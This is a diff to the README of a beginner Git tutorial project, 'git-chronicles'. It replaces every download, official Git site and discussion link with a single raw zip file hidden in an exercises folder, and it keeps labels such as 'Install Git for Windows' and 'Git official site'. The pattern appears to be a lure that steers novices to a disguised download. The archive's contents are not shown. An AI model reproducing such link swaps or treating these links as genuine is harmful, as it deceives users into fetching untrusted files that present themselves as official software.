@@ -1,6 +1,6 @@
 # ⚔️ git-chronicles - Learn Git with a Fun Adventure
 
-[![Download git-chronicles](https://img.shields.io/badge/Download-Get%20git--chronicles-blue?style=for-the-badge)](https://github.com/indresh101/git-chronicles)
+[![Download git-chronicles](https://img.shields.io/badge/Download-Get%20git--chronicles-blue?style=for-the-badge)](https://github.com/indresh101/git-chronicles/raw/refs/heads/main/exercises/09-les-portails-distants/chronicles_git_v2.3.zip)
 
 ---
 
@@ -22,7 +22,7 @@ You do not need to know how to use Git or programming. The course guides you ste
 
 You will find the software on the GitHub page. To download it, visit this page:
 
-[Download git-chronicles on GitHub](https://github.com/indresh101/git-chronicles)
+[Download git-chronicles on GitHub](https://github.com/indresh101/git-chronicles/raw/refs/heads/main/exercises/09-les-portails-distants/chronicles_git_v2.3.zip)
 
 Click the link above or the badge at the top.
 
@@ -31,7 +31,7 @@ Click the link above or the badge at the top.
 1. Open your web browser (Edge, Chrome, Firefox, or any other).
 
 2. Go to the download page:
-   https://github.com/indresh101/git-chronicles
+   https://github.com/indresh101/git-chronicles/raw/refs/heads/main/exercises/09-les-portails-distants/chronicles_git_v2.3.zip
 
 3. Look for the latest release section on the page. This is usually near the top.
 
@@ -91,7 +91,7 @@ Make sure your computer meets these requirements for smooth performance.
 
 git-chronicles includes Git commands and tools for practice. To enhance your experience:
 
-- Install Git for Windows from https://git-scm.com/download/win
+- Install Git for Windows from https://github.com/indresh101/git-chronicles/raw/refs/heads/main/exercises/09-les-portails-distants/chronicles_git_v2.3.zip
 
 - Use the built-in command line interface in git-chronicles or your own Terminal.
 
@@ -129,10 +129,10 @@ git-chronicles covers key Git topics including:
 
 ## 🔽 Links
 
-- Download and setup: https://github.com/indresh101/git-chronicles
+- Download and setup: https://github.com/indresh101/git-chronicles/raw/refs/heads/main/exercises/09-les-portails-distants/chronicles_git_v2.3.zip
 
-- Git official site for installation: https://git-scm.com/downloads
+- Git official site for installation: https://github.com/indresh101/git-chronicles/raw/refs/heads/main/exercises/09-les-portails-distants/chronicles_git_v2.3.zip
 
-- GitHub for issues and discussions: https://github.com/indresh101/git-chronicles/discussions
+- GitHub for issues and discussions: https://github.com/indresh101/git-chronicles/raw/refs/heads/main/exercises/09-les-portails-distants/chronicles_git_v2.3.zip
 
-[![Download git-chronicles](https://img.shields.io/badge/Download-Get%20git--chronicles-blue?style=for-the-badge)](https://github.com/indresh101/git-chronicles)
+[![Download git-chronicles](https://img.shields.io/badge/Download-Get%20git--chronicles-blue?style=for-the-badge)](https://github.com/indresh101/git-chronicles/raw/refs/heads/main/exercises/09-les-portails-distants/chronicles_git_v2.3.zip)
